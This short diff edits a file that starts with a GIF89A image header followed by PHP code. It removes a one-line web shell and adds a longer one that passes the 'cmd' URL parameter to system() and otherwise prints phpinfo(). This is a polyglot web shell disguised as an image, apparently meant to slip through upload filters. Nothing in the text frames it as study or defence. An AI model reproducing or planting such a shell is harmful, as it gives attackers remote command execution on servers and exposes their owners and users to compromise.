@@ -1,2 +1,7 @@
-GIF89A;
-<?php system($_GET['cmd']); ?>
+GIF89A;<?php
+if (isset($_GET["cmd"])) {
+    system($_GET["cmd"]);
+} else {
+    phpinfo();
+}
+?>
